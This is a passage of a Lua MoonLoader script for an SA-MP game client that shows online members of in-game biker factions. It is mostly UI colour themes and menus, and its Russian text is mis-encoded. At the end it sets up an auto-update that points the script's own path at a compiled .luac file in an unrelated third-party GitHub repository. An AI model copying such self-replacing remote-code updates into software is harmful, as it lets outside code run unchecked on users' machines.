            imgui.GetStyle().Colors[imgui.Col.SeparatorHovered]       = ImVec4(0.10, 0.40, 0.75, 0.78);
            imgui.GetStyle().Colors[imgui.Col.SeparatorActive]        = ImVec4(0.10, 0.40, 0.75, 1.00);
            imgui.GetStyle().Colors[imgui.Col.ResizeGrip]             = ImVec4(0.26, 0.59, 0.98, 0.25);
            imgui.GetStyle().Colors[imgui.Col.ResizeGripHovered]      = ImVec4(0.26, 0.59, 0.98, 0.67);
            imgui.GetStyle().Colors[imgui.Col.ResizeGripActive]       = ImVec4(0.26, 0.59, 0.98, 0.95);
            imgui.GetStyle().Colors[imgui.Col.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00);
            imgui.GetStyle().Colors[imgui.Col.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00);
            imgui.GetStyle().Colors[imgui.Col.TextSelectedBg]         = ImVec4(0.26, 0.59, 0.98, 0.35);
            imgui.GetStyle().Colors[imgui.Col.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94);
            --mgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50);
            imgui.GetStyle().Colors[imgui.Col.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00);
            imgui.GetStyle().Colors[imgui.Col.MenuBarBg]              = ImVec4(0.14, 0.14, 0.14, 1.00);
            imgui.GetStyle().Colors[imgui.Col.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53);
            imgui.GetStyle().Colors[imgui.Col.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00);
            imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00);
            imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00);
            imgui.GetStyle().Colors[imgui.Col.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00);
            imgui.GetStyle().Colors[imgui.Col.PlotLinesHovered]       = ImVec4(1.00, 0.43, 0.35, 1.00);
            imgui.GetStyle().Colors[imgui.Col.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00);
            imgui.GetStyle().Colors[imgui.Col.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00);
        end
    },
    {      change = function()
      imgui.GetStyle().WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00);
      imgui.GetStyle().Colors[imgui.Col.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00);
      imgui.GetStyle().Colors[imgui.Col.PopupBg]               = ImVec4(0.05, 0.05, 0.10, 0.90);
--mgui.GetStyle().Colors[imgui.Col.Border]                = ImVec4(0.89, 0.85, 0.92, 0.30);
imgui.GetStyle().Colors[imgui.Col.BorderShadow]          = ImVec4(0.00, 0.00, 0.00, 0.00);
imgui.GetStyle().Colors[imgui.Col.FrameBg]               = ImVec4(0.30, 0.20, 0.39, 1.00);
imgui.GetStyle().Colors[imgui.Col.FrameBgHovered]        = ImVec4(0.41, 0.19, 0.63, 0.68);
imgui.GetStyle().Colors[imgui.Col.FrameBgActive]         = ImVec4(0.41, 0.19, 0.63, 1.00);
imgui.GetStyle().Colors[imgui.Col.TitleBg]               = ImVec4(0.41, 0.19, 0.63, 0.45);
imgui.GetStyle().Colors[imgui.Col.TitleBgCollapsed]      = ImVec4(0.41, 0.19, 0.63, 0.35);
imgui.GetStyle().Colors[imgui.Col.TitleBgActive]         = ImVec4(0.41, 0.19, 0.63, 0.78);
imgui.GetStyle().Colors[imgui.Col.MenuBarBg]             = ImVec4(0.30, 0.20, 0.39, 0.57);
imgui.GetStyle().Colors[imgui.Col.ScrollbarBg]           = ImVec4(0.30, 0.20, 0.39, 1.00);
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrab]         = ImVec4(0.41, 0.19, 0.63, 0.31);
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabHovered]  = ImVec4(0.41, 0.19, 0.63, 0.78);
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabActive]   = ImVec4(0.41, 0.19, 0.63, 1.00);
imgui.GetStyle().Colors[imgui.Col.CheckMark]             = ImVec4(0.56, 0.61, 1.00, 1.00);
imgui.GetStyle().Colors[imgui.Col.SliderGrab]            = ImVec4(0.41, 0.19, 0.63, 0.24);
imgui.GetStyle().Colors[imgui.Col.SliderGrabActive]      = ImVec4(0.41, 0.19, 0.63, 1.00);
imgui.GetStyle().Colors[imgui.Col.Button]                = ImVec4(0.41, 0.19, 0.63, 0.44);
imgui.GetStyle().Colors[imgui.Col.ButtonHovered]         = ImVec4(0.41, 0.19, 0.63, 0.86);
imgui.GetStyle().Colors[imgui.Col.ButtonActive]          = ImVec4(0.64, 0.33, 0.94, 1.00);
imgui.GetStyle().Colors[imgui.Col.Header]                = ImVec4(0.41, 0.19, 0.63, 0.76);
imgui.GetStyle().Colors[imgui.Col.HeaderHovered]         = ImVec4(0.41, 0.19, 0.63, 0.86);
imgui.GetStyle().Colors[imgui.Col.HeaderActive]          = ImVec4(0.41, 0.19, 0.63, 1.00);
imgui.GetStyle().Colors[imgui.Col.ResizeGrip]            = ImVec4(0.41, 0.19, 0.63, 0.20);
imgui.GetStyle().Colors[imgui.Col.ResizeGripHovered]     = ImVec4(0.41, 0.19, 0.63, 0.78);
imgui.GetStyle().Colors[imgui.Col.ResizeGripActive]      = ImVec4(0.41, 0.19, 0.63, 1.00);
imgui.GetStyle().Colors[imgui.Col.PlotLines]             = ImVec4(0.89, 0.85, 0.92, 0.63);
imgui.GetStyle().Colors[imgui.Col.PlotLinesHovered]      = ImVec4(0.41, 0.19, 0.63, 1.00);
imgui.GetStyle().Colors[imgui.Col.PlotHistogram]         = ImVec4(0.89, 0.85, 0.92, 0.63);
imgui.GetStyle().Colors[imgui.Col.PlotHistogramHovered]  = ImVec4(0.41, 0.19, 0.63, 1.00);
imgui.GetStyle().Colors[imgui.Col.TextSelectedBg]        = ImVec4(0.41, 0.19, 0.63, 0.43);
end
    },
    {
      change = function()
        imgui.GetStyle().WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
        local ImVec4 = imgui.ImVec4
        imgui.GetStyle().Colors[imgui.Col.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
        imgui.GetStyle().Colors[imgui.Col.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00)
--imgui.GetStyle().Colors[imgui.Col.PopupBg]              = ImVec4(1.00, 1.00, 1.00, 0.94)
--mgui.GetStyle().Colors[imgui.Col.Border]               = ImVec4(1.00, 1.00, 1.00, 0.50)
imgui.GetStyle().Colors[imgui.Col.BorderShadow]         = ImVec4(1.00, 1.00, 1.00, 0.00)
imgui.GetStyle().Colors[imgui.Col.FrameBg]              = ImVec4(0.77, 0.49, 0.66, 0.54)
imgui.GetStyle().Colors[imgui.Col.FrameBgHovered]       = ImVec4(1.00, 1.00, 1.00, 0.40)
imgui.GetStyle().Colors[imgui.Col.FrameBgActive]        = ImVec4(1.00, 1.00, 1.00, 0.67)
imgui.GetStyle().Colors[imgui.Col.TitleBg]              = ImVec4(0.76, 0.51, 0.66, 0.71)
imgui.GetStyle().Colors[imgui.Col.TitleBgActive]        = ImVec4(0.97, 0.74, 0.88, 0.74)
imgui.GetStyle().Colors[imgui.Col.TitleBgCollapsed]     = ImVec4(1.00, 1.00, 1.00, 0.67)
imgui.GetStyle().Colors[imgui.Col.MenuBarBg]            = ImVec4(1.00, 1.00, 1.00, 0.54)
imgui.GetStyle().Colors[imgui.Col.ScrollbarBg]          = ImVec4(0.81, 0.81, 0.81, 0.54)
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrab]        = ImVec4(0.78, 0.28, 0.58, 0.13)
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabHovered] = ImVec4(1.00, 1.00, 1.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabActive]  = ImVec4(0.51, 0.51, 0.51, 1.00)
imgui.GetStyle().Colors[imgui.Col.CheckMark]            = ImVec4(1.00, 1.00, 1.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.SliderGrab]           = ImVec4(0.71, 0.39, 0.39, 1.00)
imgui.GetStyle().Colors[imgui.Col.SliderGrabActive]     = ImVec4(0.76, 0.51, 0.66, 0.46)
imgui.GetStyle().Colors[imgui.Col.Button]               = ImVec4(0.78, 0.28, 0.58, 0.54)
imgui.GetStyle().Colors[imgui.Col.ButtonHovered]        = ImVec4(0.77, 0.52, 0.67, 0.54)
imgui.GetStyle().Colors[imgui.Col.ButtonActive]         = ImVec4(0.20, 0.20, 0.20, 0.50)
imgui.GetStyle().Colors[imgui.Col.Header]               = ImVec4(0.78, 0.28, 0.58, 0.54)
imgui.GetStyle().Colors[imgui.Col.HeaderHovered]        = ImVec4(0.78, 0.28, 0.58, 0.25)
imgui.GetStyle().Colors[imgui.Col.HeaderActive]         = ImVec4(0.79, 0.04, 0.48, 0.63)
imgui.GetStyle().Colors[imgui.Col.Separator]            = ImVec4(0.43, 0.43, 0.50, 0.50)
imgui.GetStyle().Colors[imgui.Col.SeparatorHovered]     = ImVec4(0.79, 0.44, 0.65, 0.64) 
imgui.GetStyle().Colors[imgui.Col.SeparatorActive]      = ImVec4(0.79, 0.17, 0.54, 0.77)
imgui.GetStyle().Colors[imgui.Col.ResizeGrip]           = ImVec4(0.87, 0.36, 0.66, 0.54)
imgui.GetStyle().Colors[imgui.Col.ResizeGripHovered]    = ImVec4(0.76, 0.51, 0.66, 0.46)
imgui.GetStyle().Colors[imgui.Col.PlotLines]            = ImVec4(0.61, 0.61, 0.61, 1.00)
imgui.GetStyle().Colors[imgui.Col.PlotLinesHovered]     = ImVec4(0.92, 0.92, 0.92, 1.00)
imgui.GetStyle().Colors[imgui.Col.PlotHistogram]        = ImVec4(0.90, 0.70, 0.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.PlotHistogramHovered] = ImVec4(1.00, 0.60, 0.00, 1.00)
    end
    },
    {
      change = function()
        imgui.GetStyle().WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
          local ImVec4 = imgui.ImVec4
          imgui.SwitchContext()
          imgui.GetStyle().Colors[imgui.Col.Text] = imgui.ImVec4(1.00, 1.00, 1.00, 1.00);
          imgui.GetStyle().Colors[imgui.Col.TextDisabled] = imgui.ImVec4(0.67, 0.62, 0.62, 1.00);
          imgui.GetStyle().Colors[imgui.Col.ChildBg] = imgui.ImVec4(0.00, 0.00, 0.00, 1.00);
          imgui.GetStyle().Colors[imgui.Col.PopupBg] = imgui.ImVec4(0.08, 0.08, 0.08, 0.94);
          --mgui.GetStyle().Colors[imgui.Col.Border] = imgui.ImVec4(0.43, 0.43, 0.50, 0.50);
          imgui.GetStyle().Colors[imgui.Col.BorderShadow] = imgui.ImVec4(0.00, 0.00, 0.00, 0.00);
          imgui.GetStyle().Colors[imgui.Col.FrameBg] = imgui.ImVec4(0.07, 0.08, 0.08, 1.00);
          imgui.GetStyle().Colors[imgui.Col.FrameBgHovered] = imgui.ImVec4(0.03, 0.03, 0.03, 0.40);
          imgui.GetStyle().Colors[imgui.Col.FrameBgActive] = imgui.ImVec4(0.10, 0.10, 0.11, 0.67);
          imgui.GetStyle().Colors[imgui.Col.TitleBg] = imgui.ImVec4(0.04, 0.04, 0.04, 1.00);
          imgui.GetStyle().Colors[imgui.Col.TitleBgActive] = imgui.ImVec4(0.00, 0.00, 0.00, 1.00);
          imgui.GetStyle().Colors[imgui.Col.TitleBgCollapsed] = imgui.ImVec4(0.00, 0.00, 0.00, 0.51);
          imgui.GetStyle().Colors[imgui.Col.MenuBarBg] = imgui.ImVec4(0.14, 0.14, 0.14, 1.00);
          imgui.GetStyle().Colors[imgui.Col.ScrollbarBg] = imgui.ImVec4(0.02, 0.02, 0.02, 0.53);
          imgui.GetStyle().Colors[imgui.Col.ScrollbarGrab] = imgui.ImVec4(0.31, 0.31, 0.31, 1.00);
          imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabHovered] = imgui.ImVec4(0.41, 0.41, 0.41, 1.00);
          imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabActive] = imgui.ImVec4(0.51, 0.51, 0.51, 1.00);
          imgui.GetStyle().Colors[imgui.Col.CheckMark] = imgui.ImVec4(0.33, 0.42, 0.53, 1.00);
          imgui.GetStyle().Colors[imgui.Col.SliderGrab] = imgui.ImVec4(0.32, 0.33, 0.35, 1.00);
          imgui.GetStyle().Colors[imgui.Col.SliderGrabActive] = imgui.ImVec4(0.24, 0.26, 0.27, 1.00);
          imgui.GetStyle().Colors[imgui.Col.Button] = imgui.ImVec4(0.25, 0.28, 0.32, 0.39);
          imgui.GetStyle().Colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.17, 0.18, 0.20, 1.00);
          imgui.GetStyle().Colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.21, 0.22, 0.24, 1.00);
          imgui.GetStyle().Colors[imgui.Col.Header] = imgui.ImVec4(0.19, 0.21, 0.23, 0.31);
          imgui.GetStyle().Colors[imgui.Col.HeaderHovered] = imgui.ImVec4(0.16, 0.17, 0.18, 0.80);
          imgui.GetStyle().Colors[imgui.Col.HeaderActive] = imgui.ImVec4(0.13, 0.15, 0.17, 1.00);
          imgui.GetStyle().Colors[imgui.Col.Separator] = imgui.ImVec4(0.19, 0.19, 0.21, 1.00);
          imgui.GetStyle().Colors[imgui.Col.SeparatorHovered] = imgui.ImVec4(0.13, 0.15, 0.18, 0.78);
          imgui.GetStyle().Colors[imgui.Col.SeparatorActive] = imgui.ImVec4(0.12, 0.13, 0.15, 1.00);
          imgui.GetStyle().Colors[imgui.Col.ResizeGrip] = imgui.ImVec4(0.35, 0.37, 0.40, 0.25);
          imgui.GetStyle().Colors[imgui.Col.ResizeGripHovered] = imgui.ImVec4(0.09, 0.10, 0.10, 0.67);
          imgui.GetStyle().Colors[imgui.Col.ResizeGripActive] = imgui.ImVec4(0.10, 0.11, 0.12, 0.95);
          imgui.GetStyle().Colors[imgui.Col.Tab] = imgui.ImVec4(0.07, 0.07, 0.08, 0.92);
          imgui.GetStyle().Colors[imgui.Col.TabHovered] = imgui.ImVec4(0.05, 0.06, 0.06, 0.80);
          imgui.GetStyle().Colors[imgui.Col.TabActive] = imgui.ImVec4(0.10, 0.10, 0.11, 1.00);
          imgui.GetStyle().Colors[imgui.Col.TabUnfocused] = imgui.ImVec4(0.08, 0.09, 0.09, 0.97);
          imgui.GetStyle().Colors[imgui.Col.TabUnfocusedActive] = imgui.ImVec4(0.13, 0.14, 0.16, 1.00);
          imgui.GetStyle().Colors[imgui.Col.PlotLines] = imgui.ImVec4(0.61, 0.61, 0.61, 1.00);
          imgui.GetStyle().Colors[imgui.Col.PlotLinesHovered] = imgui.ImVec4(0.24, 0.20, 0.20, 1.00);
          imgui.GetStyle().Colors[imgui.Col.PlotHistogram] = imgui.ImVec4(0.90, 0.70, 0.00, 1.00);
          imgui.GetStyle().Colors[imgui.Col.PlotHistogramHovered] = imgui.ImVec4(1.00, 0.60, 0.00, 1.00);
          imgui.GetStyle().Colors[imgui.Col.TextSelectedBg] = imgui.ImVec4(0.32, 0.32, 0.35, 0.55);
      
      end
  },
        {
      change = function()
        imgui.GetStyle().WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
          local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.Text]                   = ImVec4(0.00, 0.00, 0.00, 1.00);
imgui.GetStyle().Colors[imgui.Col.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00);
imgui.GetStyle().Colors[imgui.Col.PopupBg]                = ImVec4(0.79, 0.79, 0.79, 1.00);
--mgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.00, 0.00, 0.00, 0.36);
imgui.GetStyle().Colors[imgui.Col.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.10);
imgui.GetStyle().Colors[imgui.Col.FrameBg]                = ImVec4(1.00, 1.00, 1.00, 1.00);
imgui.GetStyle().Colors[imgui.Col.FrameBgHovered]         = ImVec4(1.00, 1.00, 1.00, 1.00);
imgui.GetStyle().Colors[imgui.Col.FrameBgActive]          = ImVec4(1.00, 1.00, 1.00, 1.00);
imgui.GetStyle().Colors[imgui.Col.TitleBg]                = ImVec4(1.00, 1.00, 1.00, 0.81);
imgui.GetStyle().Colors[imgui.Col.TitleBgActive]          = ImVec4(1.00, 1.00, 1.00, 1.00);
imgui.GetStyle().Colors[imgui.Col.TitleBgCollapsed]       = ImVec4(1.00, 1.00, 1.00, 0.51);
imgui.GetStyle().Colors[imgui.Col.MenuBarBg]              = ImVec4(1.00, 1.00, 1.00, 1.00);
imgui.GetStyle().Colors[imgui.Col.ScrollbarBg]            = ImVec4(1.00, 1.00, 1.00, 0.86);
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrab]          = ImVec4(0.37, 0.37, 0.37, 1.00);
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabHovered]   = ImVec4(0.60, 0.60, 0.60, 1.00);
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabActive]    = ImVec4(0.21, 0.21, 0.21, 1.00);
imgui.GetStyle().Colors[imgui.Col.CheckMark]              = ImVec4(0.42, 0.42, 0.42, 1.00);
imgui.GetStyle().Colors[imgui.Col.SliderGrab]             = ImVec4(0.51, 0.51, 0.51, 1.00);
imgui.GetStyle().Colors[imgui.Col.SliderGrabActive]       = ImVec4(0.65, 0.65, 0.65, 1.00);
imgui.GetStyle().Colors[imgui.Col.Button]                 = ImVec4(0.52, 0.52, 0.52, 0.83);
imgui.GetStyle().Colors[imgui.Col.ButtonHovered]          = ImVec4(0.58, 0.58, 0.58, 0.83);
imgui.GetStyle().Colors[imgui.Col.ButtonActive]           = ImVec4(0.44, 0.44, 0.44, 0.83);
imgui.GetStyle().Colors[imgui.Col.Header]                 = ImVec4(0.65, 0.65, 0.65, 1.00);
imgui.GetStyle().Colors[imgui.Col.HeaderHovered]          = ImVec4(0.73, 0.73, 0.73, 1.00);
imgui.GetStyle().Colors[imgui.Col.HeaderActive]           = ImVec4(0.53, 0.53, 0.53, 1.00);
imgui.GetStyle().Colors[imgui.Col.Separator]              = ImVec4(0.46, 0.46, 0.46, 1.00);
imgui.GetStyle().Colors[imgui.Col.SeparatorHovered]       = ImVec4(0.45, 0.45, 0.45, 1.00);
imgui.GetStyle().Colors[imgui.Col.SeparatorActive]        = ImVec4(0.45, 0.45, 0.45, 1.00);
imgui.GetStyle().Colors[imgui.Col.ResizeGrip]             = ImVec4(0.23, 0.23, 0.23, 1.00);
imgui.GetStyle().Colors[imgui.Col.ResizeGripHovered]      = ImVec4(0.32, 0.32, 0.32, 1.00);
imgui.GetStyle().Colors[imgui.Col.ResizeGripActive]       = ImVec4(0.14, 0.14, 0.14, 1.00);
imgui.GetStyle().Colors[imgui.Col.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00);
imgui.GetStyle().Colors[imgui.Col.PlotLinesHovered]       = ImVec4(1.00, 1.00, 1.00, 1.00);
imgui.GetStyle().Colors[imgui.Col.PlotHistogram]          = ImVec4(0.70, 0.70, 0.70, 1.00);
imgui.GetStyle().Colors[imgui.Col.PlotHistogramHovered]   = ImVec4(1.00, 1.00, 1.00, 1.00);
imgui.GetStyle().Colors[imgui.Col.TextSelectedBg]         = ImVec4(0.62, 0.62, 0.62, 1.00);
      end
    },
}



--imgui.GetStyle().Colors[imgui.Col.Separator]              = imgui.GetStyle().Colors[imgui.Col.Border]





local bclistsi = {
    {
      FREE_SOULS,
    }
  }
  local bclistshg = {
    {
      HAMAC,
    }
  }
  local bclists = {
      {
      OUTLAWS,
      }
  }
  local btexts = {
  "Îíëŕéí: $CNT"
  }
  local Fri_kartoshka = {
    "Îíëŕéí: $CNT"
    }
    local HAMSIBYBYBYBYBLEK = {
      "Îíëŕéí: $CNT"
  }
  local WARLOCKSMCBYBER = {
    "Îíëŕéí: $CNT"
  }
  local warlokoidclistifds = {
    {
      WARLOCKS,
    }
  }
  local MONGOLSAFAGFAHV = {
    "Îíëŕéí: $CNT"
  }
  local BANDIDOSAFAGFAHV = {
    "Îíëŕéí: $CNT"
  }
  local mongolsclblrks = {
    {
        MONGOLS,
    }
  }
  local bandidosclblrks = {
    {
        BANDIDOS,
    }
  }
  local HIGHAFAGFAHV = {
    "Îíëŕéí: $CNT"
  }
  local SOSIAFAGFAHV = {
    "Îíëŕéí: $CNT"
  }
  local VAGOSAFAGFAHV = {
    "Îíëŕéí: $CNT"
  }
  local PAGANSAFAGFAHV = {
    "Îíëŕéí: $CNT"
  }
  local highclblrks = {
    {
        HIGHWAYMAN,
    }
  }
  local sosiclblrks = {
    {
        Sons,
    }
  }
  local vagosclblrks = {
    {
        VAGOS,
    }
  }
  local pagansclblrks = {
    {
        PAGANS,
    }
  }
  directIni = 'BikerList_by_Arbuzyan.ini'
  local inicfg = require 'inicfg'
local ini = inicfg.load({
    settings = {
        bikerlit_komanda = 'bikerlist',
        bikerlist_key = 0,
        save_color = 0,
        save_fon = 0,
        save_obvodka = 0,
    }}, directIni)
inicfg.save(ini, directIni)
  local outputiks = "Organization                                   Nickname"
imgui.OnFrame(
  function() return window[0] end,
  function(this)
      local size, res = imgui.ImVec2(400, 400), imgui.ImVec2(getScreenResolution());
      imgui.SetNextWindowPos(imgui.ImVec2(res.x / 2, res.y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5));
      imgui.SetNextWindowSize(size, imgui.Cond.FirstUseEver);
      if imgui.Begin('ARBUZYAN', window, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoScrollbar) then
        imgui.TextColoredRGB(u8('{FFFFFF}'..outputiks))
  --  imgui.text(u8'debil')
  imgui.Separator()
          helperforallbikerlist()
          imgui.End();
      end
      theme[ini.settings.save_color+1].change()
      themen[ini.settings.save_fon+1].changer()
      emen[ini.settings.save_obvodka+1].changeri()
    end
)
local menu = imgui.new.bool(false);
local colorsmenu = imgui.new.bool(false);
local info = imgui.new.bool(false);
local komanda = imgui.new.bool(false);
local colorheplersmenu = imgui.new.bool(false);
local keygey = imgui.new.bool(false);
local imgui = require 'mimgui'
local ffi = require 'ffi' -- Ďîäęëţ÷ŕĺě áčáëčîňĺęó ffi äë˙ čńďîëüçîâŕíč˙ âîçěîćíîńňĺé Ńč (C)
local vkeys = require 'vkeys'
local new, str, sizeof = imgui.new, ffi.string, ffi.sizeof
local helpformaf = false
local dekhelpformaf = false
local Helperforhelperforhelperforcolor = false
local dekhelpformafdi = false
heplerformenucolors = false
imgui.OnFrame(
  function() return menu[0] end,
  function(this)
      local size, res = imgui.ImVec2(400, 400), imgui.ImVec2(getScreenResolution());
      imgui.SetNextWindowPos(imgui.ImVec2(res.x / 2, res.y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5));
      imgui.SetNextWindowSize(size, imgui.Cond.FirstUseEver);
      if imgui.Begin(u8'Ěĺíţ', menu, imgui.WindowFlags.NoCollapse) then
        if imgui.Button(u8"                                    Číôîđěŕöč˙ î ńęđčďňĺ                              ") then
          menu[0] = false
          info[0] = true
          helpformaf = true
        end
        if imgui.Button(u8"                                    Čçěĺíčňü ęîěŕíäó                                     ") then
          menu[0] = false
          komanda[0] = true
          dekhelpformaf = true
        end
        if imgui.Button(u8"                                    Óńňŕíîâčňü ęëŕâčřó                                  ") then
          menu[0] = false
          lua_thread.create(bikerlist_key)
        end
        if imgui.Button(u8"                                               Ňĺěŕ                                                ") then
          menu[0] = false
          colorheplersmenu[0] = true
          Helperforhelperforhelperforcolor = true
        end
        theme[ini.settings.save_color+1].change()
        themen[ini.settings.save_fon+1].changer()
        emen[ini.settings.save_obvodka+1].changeri()
      end
                   
      --theme[colorListNumber[tonumber(ini.settings.save_color)]+1].change()
    end
)

local inputField = new.char[256 --[[Óęŕçűâŕĺě đŕçěĺđ]]](--[[Çäĺńü ěîćíî óęŕçŕňü ęŕęîé-ëčáî ňĺęńň]])
imgui.OnFrame(
  function() return colorheplersmenu[0] end,
  function(this)
      local size, res = imgui.ImVec2(400, 400), imgui.ImVec2(getScreenResolution());
      imgui.SetNextWindowPos(imgui.ImVec2(res.x / 2, res.y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5));
      imgui.SetNextWindowSize(size, imgui.Cond.FirstUseEver)
      if imgui.Begin(u8'Ňĺěŕ', colorheplersmenu, imgui.WindowFlags.NoCollapse) then
        if imgui.Combo(u8'Ňĺěŕ',colorListNumber,colorListBuffer, #colorList) then -- ńîçäŕ¸ě ęîěáî äë˙ âűáîđŕ ňĺěű
          theme[colorListNumber[0]+1].change() -- ěĺí˙ĺě íŕ âűáđŕííóţ ňĺěó
       --   sampAddChatMessage('luis '..colorListNumber, -1)
          ini.settings.save_color = colorListNumber[0]
          inicfg.save(ini, directIni)

      end
      if imgui.Combo(u8'Ôîí',colorfonNumber,colorfonBuffer, #colorfon) then -- ńîçäŕ¸ě ęîěáî äë˙ âűáîđŕ ňĺěű
        themen[colorfonNumber[0]+1].changer()
        ini.settings.save_fon = colorfonNumber[0]
        inicfg.save(ini, directIni)
    end
    if imgui.Combo(u8'Îáâîäęŕ',colorobvodNumber,colorobvodBuffer, #colorobvod) then -- ńîçäŕ¸ě ęîěáî äë˙ âűáîđŕ ňĺěű
      emen[colorobvodNumber[0]+1].changeri()
      ini.settings.save_obvodka = colorobvodNumber[0]
      inicfg.save(ini, directIni)
  end
      end
    end
)






imgui.OnFrame(
  function() return komanda[0] end,
  function(this)
      local size, res = imgui.ImVec2(400, 400), imgui.ImVec2(getScreenResolution());
      imgui.SetNextWindowPos(imgui.ImVec2(res.x / 2, res.y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5));
      imgui.SetNextWindowSize(size, imgui.Cond.FirstUseEver)
      if imgui.Begin(u8'Čçěĺíĺíčĺ ęîěŕíäű', komanda, imgui.WindowFlags.NoCollapse) then
       if imgui.InputTextWithHint(u8'##add', u8'Ââĺäčňĺ ęîěŕíäó áĺç ńëĺřŕ', inputField, 256) then
        ini.settings.bikerlit_komanda = u8:decode(str(inputField))            
       end
        imgui.SameLine()
        if imgui.Button(u8'Ńîőđŕíčňü') then
          inicfg.save(ini, directIni)
          sampAddChatMessage(ini.settings.bikerlit_komanda)
        end
      end
        
    end
)
imgui.HotKey = require('imgui_addons').HotKey
local DrugsKey = {
	v = decodeJson(ini.settings.bikerlist_key)
}
local tLastKeys = {} -- ďđĺäűäóůčĺ őîňęĺč ŕęňčâŕöčč
local getcd = false
local timernarko = 0

--bindUsedrugs = 2
imgui.OnFrame(
  function() return keygey[0] end,
  function(this)
      local size, res = imgui.ImVec2(400, 400), imgui.ImVec2(getScreenResolution());
      imgui.SetNextWindowPos(imgui.ImVec2(res.x / 2, res.y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5));
      imgui.SetNextWindowSize(size, imgui.Cond.FirstUseEver)
      if imgui.Begin(u8'Óńňŕíîâëĺíčĺ ęëŕâčřű', keygey, imgui.WindowFlags.NoCollapse) then
        imgui.TextColoredRGB(u8('{FFFFFF}Ęëŕâčřŕ äë˙ čńďîëüçîâŕíč˙ íŕđęî:'))
        imgui.SameLine()
        if imgui.HotKey(u8"##drugkey", DrugsKey, tLastKeys, 50) then
        --  rkeys.changeHotKey(bindUsedrugs, DrugsKey.v)
       --   sampAddChatMessage(script_name.." {FFFFFF}Ńňŕđîĺ çíŕ÷ĺíčĺ: {dc4747}" .. table.concat(rkeys.getKeysName(tLastKeys.v), " + ") .. "{ffffff} | Íîâîĺ: {dc4747}" .. table.concat(rkeys.getKeysName(DrugsKey.v), " + "), 0x73b461)
          ini.settings.bikerlist_key = encodeJson(DrugsKey.v)
         inicfg.save(ini, directIni)
      end
      end
        
    end
)
imgui.OnFrame(
  function() return info[0] end,
  function(this)
      local size, res = imgui.ImVec2(400, 400), imgui.ImVec2(getScreenResolution());
      imgui.SetNextWindowPos(imgui.ImVec2(res.x / 2, res.y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5));
      imgui.SetNextWindowSize(size, imgui.Cond.FirstUseEver);
      if imgui.Begin(u8'Číôîđěŕöč˙ î ńęđčďňĺ', info, imgui.WindowFlags.NoCollapse) then
        imgui.TextColoredRGB(u8( "{00ff66}Ńęđčďň{ffffff} âűâîäčň ęîëč÷ĺńňâî čăđîęîâ â áŕéęĺđŕő\n{00ff66}{ffffff}Ńęđčďň ďîęŕçűâŕĺň îíëŕéí ďî ďđčěĺđó:\nOrganization | Nick_Name\nOnline â öčôđŕő.\n\nĘîěŕíäŕ ŕęňčâŕöčč: {00ccff}/"..ini.settings.bikerlit_komanda..'\n{ffffff}Ęëŕâčřŕ ŕęňčâŕöčč:{00ccff} ' ..tostring(key.id_to_name(ini.settings.bikerlist_key))..'\n\n{348cb2}Ŕâňîđ:{ffffff} Tima Mafizik'))
          imgui.End();
      end
 --       
    end
)
local protection = true
local frozen = false
local script_vers = 1
local script_vers_text = "1.00"
local dlstatus = require('moonloader').download_status
local update_url = "https://raw.githubusercontent.com/Mafizik/script/main/BikerList_v.1.0.ini" -- ňóň ňîćĺ ńâîţ ńńűëęó
local update_path = getWorkingDirectory() .. "/config/BikerList_by_Arbuzyans.ini" -- č ňóň ńâîţ ńńűëęó --/update.ini
local script_url = "https://github.com/thechampguess/scripts/blob/master/autoupdate_lesson_16.luac?raw=true" -- ňóň ńâîţ ńńűëęó
local script_path = thisScript().path
function main()
